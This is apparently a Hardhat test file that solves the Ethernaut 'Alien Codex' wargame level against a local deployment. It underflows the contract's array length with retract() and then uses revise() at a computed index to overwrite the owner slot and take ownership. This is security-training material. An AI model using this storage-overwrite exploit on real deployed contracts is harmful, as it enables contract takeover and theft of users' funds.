import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {AlienCodex} from '../../types/typechain';

describe('Ethernaut 19: Alien Codex', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: AlienCodex;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('AlienCodex', owner).then(f => f.deploy());
    await contract.deployed();

    expect(await contract.owner()).to.eq(owner.address);
  });

  it('should claim ownership', async () => {
    // make contact to get past the modifier
    await contract.connect(attacker).make_contact();

    // retract to underflow array length
    await contract.connect(attacker).retract();

    // set owner via array indexing
    await contract
      .connect(attacker)
      .revise(
        '35707666377435648211887908874984608119992236509074197713628505308453184860938',
        ethers.utils.hexZeroPad(attacker.address, 32)
      );
  });

  after(async () => {
    expect(await contract.owner()).to.eq(attacker.address);
  });
});
